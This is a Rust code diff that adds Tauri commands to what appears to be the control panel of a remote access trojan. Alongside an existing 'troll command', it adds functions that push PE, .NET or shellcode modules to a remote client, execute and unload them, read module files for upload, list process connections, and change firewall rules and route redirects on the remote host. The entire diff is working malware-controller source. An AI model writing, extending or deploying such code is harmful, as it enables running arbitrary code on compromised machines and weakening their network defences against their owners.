@@ -1033,3 +1033,195 @@ pub async fn send_troll_command(
 
     Ok("Troll command sent".to_string())
 }
+
+#[tauri::command]
+pub async fn load_module(
+    addr: &str,
+    module_id: &str,
+    module_name: &str,
+    module_type: &str,
+    module_data: Vec<u8>,
+    entry_point: Option<String>,
+    description: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    use common::packets::{ModuleData, ModuleType};
+    
+    let mod_type = match module_type {
+        "PE" => ModuleType::PE,
+        "DotNetAssembly" => ModuleType::DotNetAssembly,
+        "Shellcode" => ModuleType::Shellcode,
+        _ => return Err("Invalid module type".to_string()),
+    };
+    
+    let module = ModuleData {
+        id: module_id.to_string(),
+        name: module_name.to_string(),
+        module_type: mod_type,
+        data: module_data,
+        entry_point,
+        description: description.to_string(),
+    };
+    
+    send_server_command(
+        ServerCommand::LoadModule(addr.parse().unwrap(), module),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Module load command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn execute_module(
+    addr: &str,
+    module_id: &str,
+    args: Vec<String>,
+    timeout: Option<u32>,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    use common::packets::ModuleExecution;
+    
+    let execution = ModuleExecution {
+        module_id: module_id.to_string(),
+        args,
+        timeout,
+    };
+    
+    send_server_command(
+        ServerCommand::ExecuteModule(addr.parse().unwrap(), execution),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Module execution command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn unload_module(
+    addr: &str,
+    module_id: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::UnloadModule(addr.parse().unwrap(), module_id.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Module unload command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn list_modules(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::ListModules(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("List modules command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn read_module_file(file_path: &str) -> Result<Vec<u8>, String> {
+    fs::read(file_path)
+        .map_err(|e| format!("Failed to read module file: {}", e))
+}
+
+#[tauri::command]
+pub async fn get_process_connections(
+    addr: String,
+    pid: usize,
+    app_handle: tauri::AppHandle,
+) -> Result<String, String> {
+    let addr: SocketAddr = addr.parse().map_err(|e| format!("Invalid address: {}", e))?;
+
+    send_command(
+        ServerCommand::GetProcessConnections(addr, pid),
+        app_handle,
+    )
+    .await?;
+
+    Ok("Get process connections command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn add_firewall_rule(
+    addr: String,
+    rule: FirewallRule,
+    app_handle: tauri::AppHandle,
+) -> Result<String, String> {
+    let addr: SocketAddr = addr.parse().map_err(|e| format!("Invalid address: {}", e))?;
+
+    send_command(
+        ServerCommand::AddFirewallRule(addr, rule),
+        app_handle,
+    )
+    .await?;
+
+    Ok("Add firewall rule command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn remove_firewall_rule(
+    addr: String,
+    rule: FirewallRule,
+    app_handle: tauri::AppHandle,
+) -> Result<String, String> {
+    let addr: SocketAddr = addr.parse().map_err(|e| format!("Invalid address: {}", e))?;
+
+    send_command(
+        ServerCommand::RemoveFirewallRule(addr, rule),
+        app_handle,
+    )
+    .await?;
+
+    Ok("Remove firewall rule command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn add_route_redirect(
+    addr: String,
+    redirect: RouteRedirect,
+    app_handle: tauri::AppHandle,
+) -> Result<String, String> {
+    let addr: SocketAddr = addr.parse().map_err(|e| format!("Invalid address: {}", e))?;
+
+    send_command(
+        ServerCommand::AddRouteRedirect(addr, redirect),
+        app_handle,
+    )
+    .await?;
+
+    Ok("Add route redirect command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn remove_route_redirect(
+    addr: String,
+    redirect: RouteRedirect,
+    app_handle: tauri::AppHandle,
+) -> Result<String, String> {
+    let addr: SocketAddr = addr.parse().map_err(|e| format!("Invalid address: {}", e))?;
+
+    send_command(
+        ServerCommand::RemoveRouteRedirect(addr, redirect),
+        app_handle,
+    )
+    .await?;
+
+    Ok("Remove route redirect command sent".to_string())
+}
+
